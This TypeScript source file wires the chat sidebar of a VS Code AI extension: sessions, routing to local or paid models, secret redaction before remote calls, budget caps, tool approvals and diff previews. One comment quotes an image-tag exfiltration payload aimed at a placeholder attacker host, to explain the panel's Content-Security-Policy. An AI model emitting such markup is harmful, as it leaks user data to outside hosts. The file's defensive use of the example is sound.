// The sidebar: sessions, context, and the turn that ties the whole extension together.
//
// This is where the pieces meet — settings decide the provider, the router decides whether the
// question is worth escalating, the egress gate decides what may leave, the agent loop runs the
// tools, and the session decides what the model is allowed to remember. Each of those lives
// somewhere else and is tested there; this file is the wiring, and it is deliberately the only
// place that knows about all of them.

import * as vscode from "vscode";
import { runTurn, type Tool } from "../core/agent/loop.js";
import type { ChatMessage } from "../core/providers/types.js";
import { costOf, makeLookup, type Price } from "../core/router/pricing.js";
import { route } from "../core/router/route.js";
import { Session, type ContextItem, type Entry, type SessionData } from "../core/session/session.js";
import { estimateTokens } from "../core/util/tokens.js";
import { isLocalEndpoint, Vault } from "../core/redaction/index.js";
import type { ToExtension, ToPanel, UiEntry, UiState } from "../shared/protocol.js";
import { endpointFor, providerFor, readSettings, routerConfig, type Keys, type Settings } from "./config.js";
import { EgressGate, safeHost } from "./egress.js";
import { buildTools } from "./tools.js";
import { WorkspaceContext, relative } from "./workspace.js";
import { SYSTEM_PROMPT, AGENT_PROMPT } from "../core/prompts.js";
import { loadPrices } from "./prices.js";

const HISTORY_KEY = "hiveyForge.sessions";
const HISTORY_MAX = 50;

export class ChatViewProvider implements vscode.WebviewViewProvider {
  public static readonly viewId = "hiveyForge.chat";

  private view?: vscode.WebviewView;
  private session = new Session();
  private attachments: ContextItem[] = [];
  private turn?: AbortController;
  private agentMode = true;
  private readonly approvals = new Map<string, (ok: boolean) => void>();
  private readonly priceLookup = makeLookup(loadPrices());

  constructor(
    private readonly ctx: vscode.ExtensionContext,
    private readonly keys: Keys,
    private readonly workspace: WorkspaceContext,
    private readonly gate: EgressGate,
    private readonly log: vscode.OutputChannel,
  ) {}

  resolveWebviewView(view: vscode.WebviewView): void {
    this.view = view;
    view.webview.options = {
      enableScripts: true,
      localResourceRoots: [vscode.Uri.joinPath(this.ctx.extensionUri, "media")],
    };
    view.webview.html = this.html(view.webview);
    view.webview.onDidReceiveMessage((m: ToExtension) => void this.onMessage(m));
  }

  // ── UI plumbing ────────────────────────────────────────────────────────────────────────────

  private post(message: ToPanel): void {
    void this.view?.webview.postMessage(message);
  }

  private html(webview: vscode.Webview): string {
    const nonce = randomNonce();
    const uri = (f: string) => webview.asWebviewUri(vscode.Uri.joinPath(this.ctx.extensionUri, "media", f));
    // No remote origin is allowed: the panel loads its own script and its own stylesheet, and a
    // model that emits an <img src="http://attacker/?data"> cannot phone home from here.
    const csp = [
      `default-src 'none'`,
      `img-src ${webview.cspSource} data:`,
      `style-src ${webview.cspSource}`,
      `font-src ${webview.cspSource}`,
      `script-src 'nonce-${nonce}'`,
    ].join("; ");
    return `<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${csp}">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="${uri("style.css")}">
<title>Hivey Forge</title>
</head>
<body>
<div id="app"></div>
<script nonce="${nonce}" src="${uri("webview.js")}"></script>
</body>
</html>`;
  }

  private uiEntry(e: Entry): UiEntry {
    return {
      id: e.id,
      role: e.role,
      text: e.text,
      at: e.at,
      included: e.included,
      pinned: e.pinned,
      error: e.error,
      model: e.model,
      usdCost: e.usdCost,
      context: e.context?.map((c) => ({ kind: c.kind, label: c.label, tokens: estimateTokens(c.body) })),
    };
  }

  private sendState(): void {
    const s = readSettings();
    const remote = !isLocalEndpoint(safeUrl(s, s.chat.provider));
    const state: UiState = {
      session: {
        id: this.session.id,
        title: this.session.title,
        updatedAt: this.session.updatedAt,
        entries: this.session.entries.map((e) => this.uiEntry(e)),
      },
      history: this.history().map((h) => ({ id: h.id, title: h.title, updatedAt: h.updatedAt })),
      model: s.chat.model,
      provider: s.chat.provider,
      remote,
      agentMode: this.agentMode,
      contextTokens: this.session.entries
        .filter((e) => e.included)
        .reduce((sum, e) => sum + estimateTokens(e.text) + (e.context ?? []).reduce((a, c) => a + estimateTokens(c.body), 0), 0),
      budget: { spentTodayUsd: this.gate.budget.spentToday(), dailyUsd: s.budget.dailyUsd },
      attachments: this.attachments.map((c) => ({ kind: c.kind, label: c.label, tokens: estimateTokens(c.body) })),
    };
    this.post({ type: "state", state });
  }

  // ── Sessions ───────────────────────────────────────────────────────────────────────────────

  private history(): SessionData[] {
    return this.ctx.workspaceState.get<SessionData[]>(HISTORY_KEY, []);
  }

  private persist(): void {
    if (!this.session.entries.length) return;
    const all = this.history().filter((s) => s.id !== this.session.id);
    all.unshift(this.session.toJSON());
    void this.ctx.workspaceState.update(HISTORY_KEY, all.slice(0, HISTORY_MAX));
  }

  newSession(): void {
    this.persist();
    this.session = new Session();
    this.attachments = [];
    this.sendState();
  }

  async focusWithPrompt(text: string, context?: ContextItem): Promise<void> {
    await vscode.commands.executeCommand("hiveyForge.chat.focus");
    if (context) this.attachments.push(context);
    this.sendState();
    await this.ask(text);
  }

  // ── Messages from the panel ────────────────────────────────────────────────────────────────

  private async onMessage(m: ToExtension): Promise<void> {
    try {
      switch (m.type) {
        case "ready":
          this.sendState();
          break;
        case "send":
          this.agentMode = m.agentMode;
          await this.ask(m.text);
          break;
        case "stop":
          this.turn?.abort();
          break;
        case "newSession":
          this.newSession();
          break;
        case "openSession": {
          this.persist();
          const found = this.history().find((s) => s.id === m.id);
          if (found) this.session = new Session(found);
          this.sendState();
          break;
        }
        case "deleteSession": {
          const rest = this.history().filter((s) => s.id !== m.id);
          await this.ctx.workspaceState.update(HISTORY_KEY, rest);
          if (this.session.id === m.id) this.session = new Session();
          this.sendState();
          break;
        }
        case "setIncluded":
          this.session.setIncluded(m.id, m.included);
          this.persist();
          this.sendState();
          break;
        case "setPinned":
          this.session.setPinned(m.id, m.pinned);
          this.persist();
          this.sendState();
          break;
        case "dropEntry":
          this.session.drop(m.id);
          this.persist();
          this.sendState();
          break;
        case "editEntry":
          this.session.editUserEntry(m.id, m.text);
          this.sendState();
          await this.runTurn();
          break;
        case "retry":
          this.session.dropLastAnswer();
          this.sendState();
          await this.runTurn();
          break;
        case "pickModel":
          await vscode.commands.executeCommand("hiveyForge.pickModel");
          this.sendState();
          break;
        case "attachActive": {
          const item = this.workspace.activeContext();
          if (item) this.attachments.push(item);
          this.sendState();
          break;
        }
        // `#` in the composer opens the editor's own file picker rather than a home-made dropdown:
        // it has fuzzy matching, recent files and keyboard handling that would take a week to copy.
        case "attachMention": {
          const files = await this.workspace.findFiles(m.query, 50);
          const picked = await vscode.window.showQuickPick(files, {
            placeHolder: "Quel fichier joindre ?",
            matchOnDescription: true,
          });
          if (picked) {
            const folder = vscode.workspace.workspaceFolders?.[0];
            if (folder) {
              const item = await this.workspace.fileContext(vscode.Uri.joinPath(folder.uri, picked), readSettings());
              if (item) this.attachments.push(item);
            }
          }
          this.sendState();
          break;
        }
        case "attachFile": {
          const picked = await vscode.window.showOpenDialog({ canSelectMany: true, openLabel: "Joindre" });
          for (const uri of picked ?? []) {
            const item = await this.workspace.fileContext(uri, readSettings());
            if (item) this.attachments.push(item);
          }
          this.sendState();
          break;
        }
        case "removeAttachment":
          this.attachments = this.attachments.filter((a) => a.label !== m.label);
          this.sendState();
          break;
        case "openEgress":
          await vscode.commands.executeCommand("hiveyForge.showEgress");
          break;
        case "approve": {
          const resolve = this.approvals.get(m.id);
          this.approvals.delete(m.id);
          resolve?.(m.approved);
          break;
        }
        case "insertCode": {
          const ed = vscode.window.activeTextEditor;
          if (!ed) {
            void vscode.window.showWarningMessage("Aucun éditeur actif où insérer ce code.");
            break;
          }
          await ed.edit((b) => b.replace(ed.selection, m.code));
          break;
        }
        case "copy":
          await vscode.env.clipboard.writeText(m.text);
          break;
      }
    } catch (err) {
      this.post({ type: "error", message: (err as Error).message });
      this.log.appendLine(`[chat] ${(err as Error).stack ?? (err as Error).message}`);
    }
  }

  private async ask(text: string): Promise<void> {
    if (!text.trim()) return;
    this.session.add({ role: "user", text, context: this.attachments.length ? this.attachments : undefined });
    this.attachments = [];
    this.sendState();
    await this.runTurn();
  }

  // ── The turn ───────────────────────────────────────────────────────────────────────────────

  private async runTurn(): Promise<void> {
    const settings = readSettings();
    this.turn?.abort();
    const ctl = new AbortController();
    this.turn = ctl;
    this.post({ type: "turnStart" });

    const nonce = randomNonce();
    const ambient = settings.context.repoMap ? await this.workspace.repoMap(Math.floor(settings.context.maxTokens * 0.4)) : undefined;
    const tools: Tool[] = this.agentMode ? buildTools({ settings: () => settings, confirmEdit: (u, n) => this.confirmEdit(u, n) }) : [];

    const built = this.session.build({
      systemPrompt: (this.agentMode ? AGENT_PROMPT : SYSTEM_PROMPT) + workspaceNote(),
      ambient: ambient ? `${ambient.text}\n\n(${ambient.files} fichiers cartographiés, ${ambient.omitted} omis)` : undefined,
      maxTokens: settings.context.maxTokens,
      nonce,
    });

    // Which model answers, and does the user want to pay for a better one?
    const lastUser = [...this.session.entries].reverse().find((e) => e.role === "user");
    const decision = route(routerConfig(settings), {
      kind: this.agentMode ? "agent" : "chat",
      prompt: lastUser?.text ?? "",
      promptTokens: built.estimatedTokens,
    });
    let providerId = decision.provider;
    let model = decision.model;
    if (decision.suggestEscalation) {
      const choice = await vscode.window.showInformationMessage(
        `Cette question dépasse le modèle local (${decision.suggestEscalation.why}). L'envoyer à ${decision.suggestEscalation.model} ?`,
        "Envoyer",
        "Rester en local",
      );
      if (choice === "Envoyer") {
        providerId = decision.suggestEscalation.provider;
        model = decision.suggestEscalation.model;
      }
    }

    const baseUrl = safeUrl(settings, providerId);
    const isLocal = isLocalEndpoint(baseUrl);
    const vault = new Vault();

    try {
      const provider = await providerFor(settings, this.keys, providerId);

      // The gate: redact, refuse, ask — once for the turn, on the messages as they stand now.
      const prepared = await this.gate.prepare(built.messages, settings, { provider: providerId, model, baseUrl, isLocal }, vault);
      if (!prepared) {
        this.post({ type: "status", text: "Envoi annulé." });
        this.post({ type: "turnEnd" });
        return;
      }

      if (!isLocal) {
        const price = this.priceLookup(model);
        const estimate = estimateCost(prepared.estimatedTokens, price);
        const verdict = this.gate.budget.check(estimate);
        if (!verdict.ok) {
          this.post({ type: "error", message: `Budget : ${verdict.message}. Ajustez hiveyForge.budget ou restez en local.` });
          this.post({ type: "turnEnd" });
          return;
        }
      }

      const answer = this.session.add({ role: "assistant", text: "", model });
      let streamed = "";

      const result = await runTurn({
        provider,
        model,
        messages: prepared.messages,
        tools,
        signal: ctl.signal,
        maxTokens: 4096,
        onDelta: (d) => {
          if (d.text) {
            streamed += d.text;
            // Placeholders are resolved as they stream, so the user never reads their own data
            // through a marker.
            this.post({ type: "delta", text: vault.restore(d.text) });
          }
          if (d.reasoning) this.post({ type: "reasoning", text: d.reasoning });
        },
        onToolResult: ({ call, result }) =>
          this.post({ type: "status", text: `${call.name}${result.isError ? " ✗" : " ✓"}` }),
        report: (msg) => this.post({ type: "status", text: msg }),
        approve: (req) => this.askApproval(req),
        // Redaction runs on EVERY step, because a tool result is new text that never went through
        // the gate — a file the agent just read can contain the credential the first prompt did not.
        beforeRequest: async (messages) => {
          if (isLocal) return messages;
          const again = await this.gate.prepare(messages, settings, { provider: providerId, model, baseUrl, isLocal }, vault);
          return again?.messages ?? messages;
        },
        afterResponse: (t) => vault.restore(t),
      });

      answer.text = result.text || streamed;
      answer.usdCost = 0;

      if (!isLocal) {
        const price = this.priceLookup(model);
        const cost = costOf(result.usage, price);
        answer.usdCost = cost.usd;
        this.gate.record(
          {
            at: Date.now(),
            provider: providerId,
            host: safeHost(baseUrl),
            model,
            promptTokens: result.usage.promptTokens,
            completionTokens: result.usage.completionTokens,
            cachedTokens: result.usage.cachedTokens,
            usd: cost.usd,
            redactions: prepared.findings.length,
            redactionSummary: summariseFindings(prepared.findings.length, vault),
          },
          settings,
        );
      }

      if (result.stoppedBecause === "max-steps") {
        this.post({ type: "status", text: "Arrêté après le nombre maximal d'étapes." });
      }
      this.persist();
    } catch (err) {
      const message = (err as Error).message;
      const last = this.session.entries[this.session.entries.length - 1];
      if (last?.role === "assistant" && !last.text) {
        last.error = message;
        last.text = "";
      }
      this.post({ type: "error", message });
      this.log.appendLine(`[turn] ${message}`);
    } finally {
      this.turn = undefined;
      this.post({ type: "turnEnd" });
      this.sendState();
    }
  }

  private askApproval(req: { tool: string; description: string }): Promise<boolean> {
    const id = randomNonce();
    this.post({ type: "approval", id, tool: req.tool, description: req.description });
    return new Promise<boolean>((resolve) => {
      this.approvals.set(id, resolve);
      // A turn that is cancelled must not leave a promise hanging forever.
      this.turn?.signal.addEventListener("abort", () => {
        if (this.approvals.delete(id)) resolve(false);
      });
    });
  }

  /** Show the change as a diff before it is applied — the reviewable-edit rule. */
  private async confirmEdit(uri: vscode.Uri, next: string): Promise<boolean> {
    const original = await readOrEmpty(uri);
    const preview = uri.with({ scheme: "hivey-forge-preview", query: Date.now().toString() });
    previewContents.set(preview.toString(), next);
    await vscode.commands.executeCommand(
      "vscode.diff",
      original === undefined ? vscode.Uri.parse("untitled:nouveau") : uri,
      preview,
      `${relative(uri)} — proposition de Hivey Forge`,
      { preview: true },
    );
    const answer = await vscode.window.showInformationMessage(
      `Appliquer la modification de ${relative(uri)} ?`,
      { modal: false },
      "Appliquer",
      "Refuser",
    );
    previewContents.delete(preview.toString());
    return answer === "Appliquer";
  }
}

/** Backing store for the diff preview documents. */
export const previewContents = new Map<string, string>();

export class PreviewProvider implements vscode.TextDocumentContentProvider {
  provideTextDocumentContent(uri: vscode.Uri): string {
    return previewContents.get(uri.toString()) ?? "";
  }
}

function workspaceNote(): string {
  const folder = vscode.workspace.workspaceFolders?.[0];
  return folder ? `\n\nWorkspace: ${folder.name}.` : "";
}

function safeUrl(s: Settings, id: Settings["chat"]["provider"]): string {
  try {
    return endpointFor(s, id);
  } catch {
    return "";
  }
}

async function readOrEmpty(uri: vscode.Uri): Promise<string | undefined> {
  try {
    return new TextDecoder().decode(await vscode.workspace.fs.readFile(uri));
  } catch {
    return undefined;
  }
}

function estimateCost(promptTokens: number, price: Price | undefined): number {
  if (!price) return 0;
  // Assume an answer about a quarter the size of the question: enough to catch a runaway prompt,
  // not so pessimistic that the cap fires on ordinary turns.
  return (promptTokens * price.in + promptTokens * 0.25 * price.out) / 1_000_000;
}

function summariseFindings(count: number, vault: Vault): string {
  return count ? vault.summary().map((s) => `${s.label}×${s.count}`).join(", ") : "";
}

function randomNonce(): string {
  const bytes = new Uint8Array(16);
  // The webview CSP nonce and the untrusted-content fence both depend on this being unguessable.
  (globalThis.crypto ?? require("node:crypto").webcrypto).getRandomValues(bytes);
  return [...bytes].map((b) => b.toString(16).padStart(2, "0")).join("");
}
